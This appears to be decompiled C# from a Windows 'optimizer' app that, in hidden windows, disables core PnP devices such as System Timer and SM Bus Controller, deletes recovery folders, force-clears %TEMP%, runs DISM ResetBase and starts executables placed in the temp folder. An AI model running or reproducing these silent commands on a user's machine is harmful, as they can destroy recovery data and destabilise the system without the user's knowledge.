			process73.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'PCI Memory Controller' | Disable-PnpDevice -confirm:$false";
			process73.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process73.StartInfo.CreateNoWindow = true;
			process73.Start();
			process73.WaitForExit();
			Process process74 = new Process();
			process74.StartInfo.FileName = "powershell.exe";
			process74.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'PCI Simple Communications Controller' | Disable-PnpDevice -confirm:$false";
			process74.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process74.StartInfo.CreateNoWindow = true;
			process74.Start();
			process74.WaitForExit();
			Process process75 = new Process();
			process75.StartInfo.FileName = "powershell.exe";
			process75.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'Realtek USB 2.0 Card Reader' | Disable-PnpDevice -confirm:$false";
			process75.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process75.StartInfo.CreateNoWindow = true;
			process75.Start();
			process75.WaitForExit();
			Process process76 = new Process();
			process76.StartInfo.FileName = "powershell.exe";
			process76.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'SM Bus Controller' | Disable-PnpDevice -confirm:$false";
			process76.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process76.StartInfo.CreateNoWindow = true;
			process76.Start();
			process76.WaitForExit();
			Process process77 = new Process();
			process77.StartInfo.FileName = "powershell.exe";
			process77.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'System Speaker' | Disable-PnpDevice -confirm:$false";
			process77.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process77.StartInfo.CreateNoWindow = true;
			process77.Start();
			process77.WaitForExit();
			Process process78 = new Process();
			process78.StartInfo.FileName = "powershell.exe";
			process78.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'System Timer' | Disable-PnpDevice -confirm:$false";
			process78.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process78.StartInfo.CreateNoWindow = true;
			process78.Start();
			process78.WaitForExit();
			Process process79 = new Process();
			process79.StartInfo.FileName = "powershell.exe";
			process79.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'UMBus Root Bus Enumerator' | Disable-PnpDevice -confirm:$false";
			process79.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process79.StartInfo.CreateNoWindow = true;
			process79.Start();
			process79.WaitForExit();
			Process process80 = new Process();
			process80.StartInfo.FileName = "cmd.exe";
			process80.StartInfo.Arguments = "/c C:/Windows/System32/devmgmt.msc";
			process80.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process80.StartInfo.CreateNoWindow = true;
			process80.Start();
			process80.WaitForExit();
			Process.Start(Path.GetTempPath() + "MSI_MODE_TOOL.exe");
			Process.Start(Path.GetTempPath() + "Affinities.exe");
			Process.Start(Path.GetTempPath() + "Autoruns64.exe");
			Process.Start(Path.GetTempPath() + "CPUZ.exe");
			Process diskcleanup = new Process();
			diskcleanup.StartInfo.FileName = "cmd.exe";
			diskcleanup.StartInfo.Arguments = "/c cleanmgr /sageset:0";
			diskcleanup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			diskcleanup.StartInfo.CreateNoWindow = true;
			diskcleanup.Start();
			diskcleanup.WaitForExit();
			Process diskcleanup2 = new Process();
			diskcleanup2.StartInfo.FileName = "cmd.exe";
			diskcleanup2.StartInfo.Arguments = "/c cleanmgr /sagerun:0";
			diskcleanup2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			diskcleanup2.StartInfo.CreateNoWindow = true;
			diskcleanup2.Start();
			diskcleanup2.WaitForExit();
			try
			{
				Directory.Delete("C:/AdwCleaner", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:/Perflogs", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:/$SysReset", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:/$WinREAgent", true);
			}
			catch
			{
			}
			Process defrag = new Process();
			defrag.StartInfo.FileName = "Defrag.exe";
			defrag.StartInfo.Arguments = "-c -h -o -$";
			defrag.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			defrag.StartInfo.CreateNoWindow = true;
			defrag.Start();
			defrag.WaitForExit();
			Process cleartemp = new Process();
			cleartemp.StartInfo.FileName = "cmd.exe";
			cleartemp.StartInfo.Arguments = "/c DEL /F /S /Q %TEMP%";
			cleartemp.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			cleartemp.StartInfo.CreateNoWindow = true;
			cleartemp.Start();
			cleartemp.WaitForExit();
			Process WinSxS = new Process();
			WinSxS.StartInfo.FileName = "DISM";
			WinSxS.StartInfo.Arguments = "/Online /Cleanup-Image /StartComponentCleanup /ResetBase";
			WinSxS.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			WinSxS.StartInfo.CreateNoWindow = true;
			WinSxS.Start();
			WinSxS.WaitForExit();
			Process reservedstorage = new Process();
			reservedstorage.StartInfo.FileName = "DISM";
			reservedstorage.StartInfo.Arguments = "/Online /Set-ReservedStorageState /State:Disabled";
			reservedstorage.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			reservedstorage.StartInfo.CreateNoWindow = true;
			reservedstorage.Start();
			reservedstorage.WaitForExit();
			ZipFile.ExtractToDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\SDelete.zip", Environment.GetFolderPath(Environment.SpecialFolder.Windows) ?? "");
		}

		// Token: 0x06000028 RID: 40 RVA: 0x0000906C File Offset: 0x0000726C
		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "7.0.3.0")]
		public void InitializeComponent()
		{
			bool contentLoaded = this._contentLoaded;
			if (!contentLoaded)
			{
				this._contentLoaded = true;
				Uri resourceLocater = new Uri("/XillyService;component/view/cpo.xaml", UriKind.Relative);
				Application.LoadComponent(this, resourceLocater);
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000090A4 File Offset: 0x000072A4
		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "7.0.3.0")]
		[EditorBrowsable(EditorBrowsableState.Never)]
		void IComponentConnector.Connect(int connectionId, object target)
		{
			switch (connectionId)
			{
			case 1:
				this.Activatebutton = (Button)target;
				this.Activatebutton.Click += this.Activatebutton_Click;
				break;
			case 2:
				this.WindowsButton = (Button)target;
				this.WindowsButton.Click += this.WindowsButton_Click;
				break;
			case 3:
				this.GraphicsButton = (Button)target;
				this.GraphicsButton.Click += this.GraphicsButton_Click;
				break;
			case 4:
				this.OtherButton = (Button)target;
				this.OtherButton.Click += this.OtherButton_Click;
				break;
			case 5:
				this.RAM = (TextBox)target;
				break;
			case 6:
				this.winver = (TextBox)target;
				break;
			default:
				this._contentLoaded = true;
				break;
			}
		}

		// Token: 0x0400000D RID: 13
		private bool Desktop = false;

		// Token: 0x0400000E RID: 14
		private bool RADEON = false;

		// Token: 0x0400000F RID: 15
		private string programFiles = Environment.ExpandEnvironmentVariables("%ProgramW6432%");

		// Token: 0x04000010 RID: 16
		internal Button Activatebutton;

		// Token: 0x04000011 RID: 17
		internal Button WindowsButton;

		// Token: 0x04000012 RID: 18
		internal Button GraphicsButton;

		// Token: 0x04000013 RID: 19
		internal Button OtherButton;

		// Token: 0x04000014 RID: 20
		internal TextBox RAM;

		// Token: 0x04000015 RID: 21
		internal TextBox winver;

		// Token: 0x04000016 RID: 22
		private bool _contentLoaded;
	}
}
